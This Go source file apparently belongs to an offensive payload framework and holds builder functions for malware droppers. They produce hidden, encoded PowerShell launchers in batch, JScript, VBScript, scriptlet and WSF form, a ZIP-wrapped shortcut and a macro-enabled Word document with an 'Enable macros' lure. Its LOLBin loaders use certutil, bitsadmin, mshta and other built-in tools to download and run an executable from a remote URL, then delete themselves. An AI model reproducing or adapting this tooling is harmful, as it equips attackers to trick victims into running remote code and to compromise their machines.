package server

import (
	"archive/zip"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// BuildPS1 saves the raw PowerShell script as a .ps1 file.
func BuildPS1(psScript, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	name := ensureExt(lureName, ".ps1")
	outPath := filepath.Join(outDir, name)
	return outPath, os.WriteFile(outPath, []byte(psScript), 0644)
}

// BuildBAT generates a batch file that spawns a hidden PowerShell process.
func BuildBAT(psScript, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	enc := utf16LEBase64(psScript)
	content := fmt.Sprintf(
		"@echo off\r\npowershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s\r\n",
		enc)
	outPath := filepath.Join(outDir, ensureExt(lureName, ".bat"))
	return outPath, os.WriteFile(outPath, []byte(content), 0644)
}

// BuildJScript generates a JScript (.js) dropper via WScript.Shell → PS cradle.
func BuildJScript(psScript, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	enc := utf16LEBase64(psScript)
	content := fmt.Sprintf(
		`var s=new ActiveXObject("WScript.Shell");`+
			`s.Run("powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s",0,false);`,
		enc)
	outPath := filepath.Join(outDir, ensureExt(lureName, ".js"))
	return outPath, os.WriteFile(outPath, []byte(content), 0644)
}

// BuildVBScript generates a VBScript (.vbs) dropper via WScript.Shell → PS cradle.
func BuildVBScript(psScript, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	enc := utf16LEBase64(psScript)
	content := fmt.Sprintf(
		"Set s=CreateObject(\"WScript.Shell\")\r\n"+
			"s.Run \"powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s\",0,False\r\n",
		enc)
	outPath := filepath.Join(outDir, ensureExt(lureName, ".vbs"))
	return outPath, os.WriteFile(outPath, []byte(content), 0644)
}

// BuildSCT generates a Windows Scriptlet (.sct) for regsvr32 Squiblydoo bypass.
// Usage on target: regsvr32 /s /n /u /i:<url_to_sct> scrobj.dll
func BuildSCT(psScript, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	enc := utf16LEBase64(psScript)
	jsCmd := fmt.Sprintf(
		`var s=new ActiveXObject("WScript.Shell");`+
			`s.Run("powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s",0,false);`,
		enc)
	content := fmt.Sprintf(`<?XML version="1.0"?>
<scriptlet>
<registration progid="Update" classid="{89EA7F24-A4DB-4F0B-AC51-AC7E56B86E42}">
<script language="JScript">
<![CDATA[
%s
]]>
</script>
</registration>
</scriptlet>
`, jsCmd)
	outPath := filepath.Join(outDir, ensureExt(lureName, ".sct"))
	return outPath, os.WriteFile(outPath, []byte(content), 0644)
}

// BuildWSF generates a Windows Script File (.wsf) dropper.
func BuildWSF(psScript, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	enc := utf16LEBase64(psScript)
	jsCmd := fmt.Sprintf(
		`var s=new ActiveXObject("WScript.Shell");`+
			`s.Run("powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s",0,false);`,
		enc)
	content := fmt.Sprintf(`<job>
<script language="JScript">
<![CDATA[
%s
]]>
</script>
</job>
`, jsCmd)
	outPath := filepath.Join(outDir, ensureExt(lureName, ".wsf"))
	return outPath, os.WriteFile(outPath, []byte(content), 0644)
}

// BuildZIPLNK wraps an LNK file inside a ZIP archive.
func BuildZIPLNK(lnkPath, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	lnkData, err := os.ReadFile(lnkPath)
	if err != nil {
		return "", err
	}
	base := strings.TrimSuffix(lureName, filepath.Ext(lureName))
	zipPath := filepath.Join(outDir, base+".zip")
	f, err := os.Create(zipPath)
	if err != nil {
		return "", err
	}
	defer f.Close()

	zw := zip.NewWriter(f)
	defer zw.Close()

	w, err := zw.Create(ensureExt(lureName, ".lnk"))
	if err != nil {
		return "", err
	}
	_, err = w.Write(lnkData)
	return zipPath, err
}

// BuildWordMacro generates a .docm (Word macro-enabled document) whose
// AutoOpen / Document_Open macro runs psScript via WScript.Shell.
// Requires Python 3 (calls server/gen_docm.py).
func BuildWordMacro(psScript, lureName, outDir string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}
	name := ensureExt(lureName, ".docm")
	outPath := filepath.Join(outDir, name)

	// Locate gen_docm.py relative to the project root
	script := filepath.Join(projectRoot(), "server", "gen_docm.py")
	if _, err := os.Stat(script); err != nil {
		return "", fmt.Errorf("gen_docm.py not found at %s", script)
	}

	lure := "This document is protected. Enable macros to view its contents."
	cmd := exec.Command("python3", script, psScript, outPath, lure)
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("gen_docm: %w\n%s", err, out)
	}
	return outPath, nil
}

// BuildLOLBinLoader generates a .bat file for a given LOLBin technique that
// downloads and executes a raw EXE staged at payloadURL.
//
// Supported techniques: certutil, bitsadmin, msiexec, regsvr32, mshta, wmic
//
// Each .bat file is self-deleting (del /f /q "%~f0") and prefixed with @echo off.
func BuildLOLBinLoader(technique, payloadURL, outDir, lureName string) (string, error) {
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	var cmdLine string
	switch strings.ToLower(technique) {
	case "certutil":
		cmdLine = fmt.Sprintf(
			"certutil.exe -urlcache -split -f %s C:\\Windows\\Temp\\t.b64 && "+
				"certutil.exe -decode C:\\Windows\\Temp\\t.b64 C:\\Windows\\Temp\\t.exe && "+
				"C:\\Windows\\Temp\\t.exe",
			payloadURL)
	case "bitsadmin":
		cmdLine = fmt.Sprintf(
			"bitsadmin /transfer job /download /priority high %s C:\\Windows\\Temp\\t.exe && "+
				"C:\\Windows\\Temp\\t.exe",
			payloadURL)
	case "msiexec":
		cmdLine = fmt.Sprintf("msiexec /q /i %s", payloadURL)
	case "regsvr32":
		cmdLine = fmt.Sprintf("regsvr32 /s /n /u /i:%s scrobj.dll", payloadURL)
	case "mshta":
		cmdLine = fmt.Sprintf("mshta.exe %s", payloadURL)
	case "wmic":
		cmdLine = fmt.Sprintf(`wmic os get /format:"%s"`, payloadURL)
	default:
		return "", fmt.Errorf("unknown LOLBin technique: %s (supported: certutil, bitsadmin, msiexec, regsvr32, mshta, wmic)", technique)
	}

	content := fmt.Sprintf(
		"@echo off\r\n%s\r\ndel /f /q \"%%~f0\"\r\n",
		cmdLine)

	baseName := lureName
	if baseName == "" {
		baseName = technique
	}
	outPath := filepath.Join(outDir, ensureExt(baseName+"_"+technique, ".bat"))
	return outPath, os.WriteFile(outPath, []byte(content), 0644)
}

// ensureExt returns name with ext appended if it doesn't already end with it.
func ensureExt(name, ext string) string {
	if strings.EqualFold(filepath.Ext(name), ext) {
		return name
	}
	return name + ext
}
